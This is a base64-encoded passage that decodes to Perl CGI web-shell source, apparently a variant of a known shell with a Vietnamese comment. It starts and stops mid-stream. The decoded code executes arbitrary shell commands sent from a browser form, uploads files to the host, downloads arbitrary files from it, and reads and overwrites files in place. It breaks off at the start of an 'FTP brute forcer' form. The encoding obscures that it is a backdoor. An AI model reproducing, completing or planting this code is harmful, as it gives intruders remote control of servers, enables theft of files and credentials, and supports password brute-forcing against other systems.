YnNwOyZuYnNwOzxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEVuY29kZUN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9InVwbG9hZCI+DQo8L2Zvcm0+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB0aW1lb3V0IGZvciBhIGNvbW1hbmQgZXhwaXJlcy4gV2UgbmVlZCB0bw0KIyB0ZXJtaW5hdGUgdGhlIHNjcmlwdCBpbW1lZGlhdGVseS4gVGhpcyBmdW5jdGlvbiBpcyB2YWxpZCBvbmx5IG9uIFVuaXguIEl0IGlzDQojIG5ldmVyIGNhbGxlZCB3aGVuIHRoZSBzY3JpcHQgaXMgcnVubmluZyBvbiBOVC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBDb21tYW5kVGltZW91dA0Kew0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgkJcmV0dXJuIDw8RU5EOw0KPC90ZXh0YXJlYT4NCjxicj48Zm9udCBjb2xvcj15ZWxsb3c+DQpDb21tYW5kIGV4Y2VlZGVkIG1heGltdW0gdGltZSBvZiAkQ29tbWFuZFRpbWVvdXREdXJhdGlvbiBzZWNvbmQocykuPC9mb250Pg0KPGJyPjxmb250IHNpemU9JzYnIGNvbG9yPXJlZD5LaWxsZWQgaXQhPC9mb250Pg0KRU5EDQoJfQ0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQgY29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcg0KIyB0byBkb3dubG9hZCB0aGUgc3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gNCiMgZmVhdHVyZSB0aGF0IHN0YXJ0cyB0aGUgZG93bmxvYWQgYXV0b21hdGljYWxseS4NCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludERvd25sb2FkTGlua1BhZ2UNCnsNCglsb2NhbCgkRmlsZVVybCkgPSBAXzsNCglteSAkcmVzdWx0PSIiOw0KCWlmKC1lICRGaWxlVXJsKSAjIGlmIHRoZSBmaWxlIGV4aXN0cw0KCXsNCgkJIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3Nlcg0KCQkkRmlsZVVybCA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQoJCSREb3dubG9hZExpbmsgPSAiJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZj0kRmlsZVVybCZvPWdvIjsNCgkJJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsNCgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQkkcmVzdWx0IC49IDw8RU5EOw0KU2VuZGluZyBGaWxlICRUcmFuc2ZlckZpbGUuLi48YnI+DQoNCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LA0KPGEgaHJlZj0iJERvd25sb2FkTGluayI+Q2xpY2sgSGVyZTwvYT4NCkVORA0KCQkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCX0NCgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0DQoJew0KCQkkcmVzdWx0IC49ICJGYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhIjsNCgkJJHJlc3VsdCAuPSAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlDQojIGJyb3dzZXIsIHNvIHRoYXQgaXQgY2FuIGJlIGRvd25sb2FkZWQgYnkgdGhlIHVzZXIuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBzZW50Lg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyDQp7DQoJbXkgJHJlc3VsdCA9ICIiOw0KCWxvY2FsKCRTZW5kRmlsZSkgPSBAXzsNCglpZihvcGVuKFNFTkRGSUxFLCAkU2VuZEZpbGUpKSAjIGZpbGUgb3BlbmVkIGZvciByZWFkaW5nDQoJew0KCQlpZigkV2luTlQpDQoJCXsNCgkJCWJpbm1vZGUoU0VOREZJTEUpOw0KCQkJYmlubW9kZShTVERPVVQpOw0KCQl9DQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOw0KCQkoJEZpbGVuYW1lID0gJFNlbmRGaWxlKSA9fiAgbSEoW14vXlxcXSopJCE7DQoJCXByaW50ICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtdW5rbm93blxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7DQoJCXByaW50ICJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0kMVxuXG4iOw0KCQlwcmludCB3aGlsZSg8U0VOREZJTEU+KTsNCgkJY2xvc2UoU0VOREZJTEUpOw0KCQlleGl0KDEpOw0KCX0NCgllbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQ0KCXsNCgkJJHJlc3VsdCAuPSAiRmFpbGVkIHRvIGRvd25sb2FkICRTZW5kRmlsZTogJCEiOw0KCQkkcmVzdWx0IC49JlByaW50RmlsZURvd25sb2FkRm9ybTsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlDQojIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsgdGhyb3VnaCB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMgVGhpcyBmdW5jdGlvbiBpcyBhbHNvIGNhbGxlZCB3aGVuIHRoZSB1c2VyIGNsaWNrcyBvbiB0aGF0IGxpbmsuIEluIHRoaXMgY2FzZSwNCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCZWdpbkRvd25sb2FkDQp7DQoJJEVuY29kZUN1cnJlbnREaXIgPSBFbmNvZGVEaXIoJEN1cnJlbnREaXIpOw0KCSMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwNCgkJKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQoJew0KCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQoJfQ0KCWVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQoJew0KCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCQkkVGFyZ2V0RmlsZSAuPSAkUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCX0NCg0KCWlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQoJew0KCQkmU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KCX0NCgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0KCXsNCgkJJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZS4gSWYgdGhlDQojIGZpbGUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQ0KIyBmaWxlLCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBVcGxvYWRGaWxlDQp7DQoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluDQoJaWYoJFRyYW5zZmVyRmlsZSBlcSAiIikNCgl7DQoJCXJldHVybiAmUHJpbnRGaWxlVXBsb2FkRm9ybTsNCg0KCX0NCglteSAkcmVzdWx0PSIiOw0KCSMgc3RhcnQgdGhlIHVwbG9hZGluZyBwcm9jZXNzDQoJJHJlc3VsdCAuPSAiVXBsb2FkaW5nICRUcmFuc2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsNCg0KCSMgZ2V0IHRoZSBmdWxsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQNCgljaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkkVHJhbnNmZXJGaWxlID1+IG0hKFteL15cXF0qKSQhOw0KCSRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQxOw0KDQoJJFRhcmdldEZpbGVTaXplID0gbGVuZ3RoKCRpbnsnZmlsZWRhdGEnfSk7DQoJIyBpZiB0aGUgZmlsZSBleGlzdHMgYW5kIHdlIGFyZSBub3Qgc3VwcG9zZWQgdG8gb3ZlcndyaXRlIGl0DQoJaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpDQoJew0KCQkkcmVzdWx0IC49ICJGYWlsZWQ6IERlc3RpbmF0aW9uIGZpbGUgYWxyZWFkeSBleGlzdHMuPGJyPiI7DQoJfQ0KCWVsc2UgIyBmaWxlIGlzIG5vdCBwcmVzZW50DQoJew0KCQlpZihvcGVuKFVQTE9BREZJTEUsICI+JFRhcmdldE5hbWUiKSkNCgkJew0KCQkJYmlubW9kZShVUExPQURGSUxFKSBpZiAkV2luTlQ7DQoJCQlwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsNCgkJCWNsb3NlKFVQTE9BREZJTEUpOw0KCQkJJHJlc3VsdCAuPSAiVHJhbnNmZXJlZCAkVGFyZ2V0RmlsZVNpemUgQnl0ZXMuPGJyPiI7DQoJCQkkcmVzdWx0IC49ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7DQoJCX0NCgkJZWxzZQ0KCQl7DQoJCQkkcmVzdWx0IC49ICJGYWlsZWQ6ICQhPGJyPiI7DQoJCX0NCgl9DQoJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlbmFtZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluaw0KIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBEb3dubG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgZG93bmxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCXJldHVybiAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCg0KCSMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwgKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQoJew0KCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQoJfQ0KCWVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQoJew0KCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCQkkVGFyZ2V0RmlsZSAuPSAkUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCX0NCg0KCWlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQoJew0KCQlyZXR1cm4gJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCgl9DQoJZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCgl7DQoJCXJldHVybiAmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCgl9DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGV4ZWN1dGUgY29tbWFuZHMuIEl0IGRpc3BsYXlzIHRoZSBvdXRwdXQgb2YgdGhlDQojIGNvbW1hbmQgYW5kIGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBhbm90aGVyIGNvbW1hbmQuIFRoZSBjaGFuZ2UgZGlyZWN0b3J5DQojIGNvbW1hbmQgaXMgaGFuZGxlZCBkaWZmZXJlbnRseS4gSW4gdGhpcyBjYXNlLCB0aGUgbmV3IGRpcmVjdG9yeSBpcyBzdG9yZWQgaW4NCiMgYW4gaW50ZXJuYWwgdmFyaWFibGUgYW5kIGlzIHVzZWQgZWFjaCB0aW1lIGEgY29tbWFuZCBoYXMgdG8gYmUgZXhlY3V0ZWQuIFRoZQ0KIyBvdXRwdXQgb2YgdGhlIGNoYW5nZSBkaXJlY3RvcnkgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkIHRvIHRoZSB1c2Vycw0KIyB0aGVyZWZvcmUgZXJyb3IgbWVzc2FnZXMgY2Fubm90IGJlIGRpc3BsYXllZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBFeGVjdXRlQ29tbWFuZA0Kew0KCSRDdXJyZW50RGlyID0gJlRyaW1TbGFzaGVzKCRDdXJyZW50RGlyKTsNCglteSAkcmVzdWx0PSIiOw0KCWlmKCRSdW5Db21tYW5kID1+IG0vXlxzKmNkXHMrKC4rKS8pICMgaXQgaXMgYSBjaGFuZ2UgZGlyIGNvbW1hbmQNCgl7DQoJCSMgd2UgY2hhbmdlIHRoZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUNCgkJIyBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQuDQoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4iY2QgJDEiLiRDbWRTZXAuJENtZFB3ZDsNCgkJY2hvbXAoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsNCgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCg0KCQkkcmVzdWx0IC49ICJDb21tYW5kOiA8cnVuPiRSdW5Db21tYW5kIDwvcnVuPjxicj48dGV4dGFyZWEgY29scz0nJGNvbHMnIHJvd3M9JyRyb3dzJyBzcGVsbGNoZWNrPSdmYWxzZSc+IjsNCgkJIyB4dWF0IHRob25nIHRpbiBraGkgY2h1eWVuIGRlbiAxIHRodSBtdWMgbmFvIGRvIQ0KCQkkUnVuQ29tbWFuZD0gJFdpbk5UPyJkaXIiOiJkaXIgLWxpYSI7DQoJCSRyZXN1bHQgLj0gJlJ1bkNtZDsNCgl9ZWxzaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqZWRpdFxzKyguKykvKQ0KCXsNCgkJJHJlc3VsdCAuPSAgJlNhdmVGaWxlRm9ybTsNCgl9ZWxzZQ0KCXsNCgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZDwvcnVuPjxicj48dGV4dGFyZWEgaWQ9J2RhdGEnIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7DQoJCSRyZXN1bHQgLj0mUnVuQ21kOw0KCX0NCgkkcmVzdWx0IC49ICAiPC90ZXh0YXJlYT4iOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBydW4gY29tbWFuZA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFJ1bkNtZA0Kew0KCW15ICRyZXN1bHQ9IiI7DQoJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiRSdW5Db21tYW5kLiRSZWRpcmVjdG9yOw0KCWlmKCEkV2luTlQpDQoJew0KCQkkU0lHeydBTFJNJ30gPSBcJkNvbW1hbmRUaW1lb3V0Ow0KCQlhbGFybSgkQ29tbWFuZFRpbWVvdXREdXJhdGlvbik7DQoJfQ0KCWlmKCRTaG93RHluYW1pY091dHB1dCkgIyBzaG93IG91dHB1dCBhcyBpdCBpcyBnZW5lcmF0ZWQNCgl7DQoJCSR8PTE7DQoJCSRDb21tYW5kIC49ICIgfCI7DQoJCW9wZW4oQ29tbWFuZE91dHB1dCwgJENvbW1hbmQpOw0KCQl3aGlsZSg8Q29tbWFuZE91dHB1dD4pDQoJCXsNCgkJCSRfID1+IHMvKFxufFxyXG4pJC8vOw0KCQkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygiJF9cbiIpOw0KCQl9DQoJCSR8PTA7DQoJfQ0KCWVsc2UgIyBzaG93IG91dHB1dCBhZnRlciBjb21tYW5kIGNvbXBsZXRlcw0KCXsNCgkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygkQ29tbWFuZCk7DQoJfQ0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQojIEZvcm0gU2F2ZSBGaWxlIA0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0Kc3ViIFNhdmVGaWxlRm9ybQ0Kew0KCW15ICRyZXN1bHQgPSIiOw0KCSRFbmNvZGVDdXJyZW50RGlyID0gRW5jb2RlRGlyKCRDdXJyZW50RGlyKTsNCglzdWJzdHIoJFJ1bkNvbW1hbmQsMCw1KT0iIjsNCglteSAkZmlsZT0mdHJpbSgkUnVuQ29tbWFuZCk7DQoJJHNhdmU9Jzxicj48aW5wdXQgbmFtZT0iYSIgdHlwZT0ic3VibWl0IiB2YWx1ZT0ic2F2ZSIgPic7DQoJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuJFJ1bkNvbW1hbmQ7DQoJbXkgJGRpcj0iPHNwYW4gc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz4iLiZBZGRMaW5rRGlyKCJndWkiKS4iPC9zcGFuPiI7DQoJaWYoLXcgJEZpbGUpDQoJew0KCQkkcm93cz0iMjMiDQoJfWVsc2UNCgl7DQoJCSRtc2c9Ijxicj48Zm9udCBzdHlsZT0nY29sb3I6IHllbGxvdzsnID4gQ2Fubid0IHdyaXRlIGZpbGUhPGZvbnQ+PGJyPiI7DQoJCSRyb3dzPSIyMCINCgl9DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICI8Zm9udCBjb2xvcj0nI0ZGRkZGRic+W2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkPC9mb250PiAiOw0KCSRSdW5Db21tYW5kID0gImVkaXQgJFJ1bkNvbW1hbmQiOw0KCSRyZXN1bHQgLj0gIDw8RU5EOw0KCTxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KDQoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRFbmNvZGVDdXJyZW50RGlyIj4NCgkkUHJvbXB0DQoJPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjQwIiBuYW1lPSJjIj4NCgk8aW5wdXQgbmFtZT0icyIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPg0KCTxicj5Db21tYW5kOiA8cnVuPiAkUnVuQ29tbWFuZCA8L3J1bj4NCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmaWxlIiB2YWx1ZT0iJGZpbGUiID4gJHNhdmUgPGJyPiAkbXNnDQoJPGJyPjx0ZXh0YXJlYSBpZD0iZGF0YSIgbmFtZT0iZGF0YSIgY29scz0iJGNvbHMiIHJvd3M9IiRyb3dzIiBzcGVsbGNoZWNrPSJmYWxzZSI+DQpFTkQNCg0KCSRyZXN1bHQgLj0gJkh0bWxTcGVjaWFsQ2hhcnMoJkZpbGVPcGVuKCRGaWxlLDApKTsNCgkkcmVzdWx0IC49ICI8L3RleHRhcmVhPiI7DQoJJHJlc3VsdCAuPSAiPC9mb3JtPiI7DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQojIEZpbGUgT3Blbg0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0Kc3ViIEZpbGVPcGVuKCQpew0KCW15ICRmaWxlID0gc2hpZnQ7DQoJbXkgJGJpbmFyeSA9IHNoaWZ0Ow0KCW15ICRyZXN1bHQgPSAiIjsNCglteSAkbiA9ICIiOw0KCWlmKC1mICRmaWxlKXsNCgkJaWYob3BlbihGSUxFLCRmaWxlKSl7DQoJCQlpZigkYmluYXJ5KXsNCgkJCQliaW5tb2RlIEZJTEU7DQoJCQl9DQoJCQl3aGlsZSAoKCRuID0gcmVhZCBGSUxFLCAkZGF0YSwgMTAyNCkgIT0gMCkgew0KCQkJCSRyZXN1bHQgLj0gJGRhdGE7DQoJCQl9DQoJCQljbG9zZShGSUxFKTsNCgkJfQ0KCX1lbHNlDQoJew0KCQlyZXR1cm4gIk5vdCdzIGEgRmlsZSEiOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCiMgU2F2ZSBGaWxlDQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpzdWIgU2F2ZUZpbGUoJCkNCnsNCglteSAkRGF0YT0gc2hpZnQgOw0KCW15ICRGaWxlPSBzaGlmdDsNCgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kRmlsZTsNCglpZihvcGVuKEZJTEUsICI+JEZpbGUiKSkNCgl7DQoJCWJpbm1vZGUgRklMRTsNCgkJcHJpbnQgRklMRSAkRGF0YTsNCgkJY2xvc2UgRklMRTsNCgkJcmV0dXJuIDE7DQoJfWVsc2UNCgl7DQoJCXJldHVybiAwOw0KCX0NCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQnJ1dGUgRm9yY2VyIEZvcm0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCcnV0ZUZvcmNlckZvcm0NCnsNCglteSAkcmVzdWx0PSIiOw0KCSRyZXN1bHQgLj0gPDxFTkQ7DQoNCjx0YWJsZT4NCg0KPHRyPg0KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjPGJyPg0KU2ltcGxlIEZUUCBicnV0ZSBmb3JjZXI8YnI+DQpOb3RlOiBPbmx5IHNjYW4gZnJvbSAxIHRvIDMgdXNlciA6LVM8YnI+DQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCjxmb3JtIG5hbWU9ImYiIG1ldGhv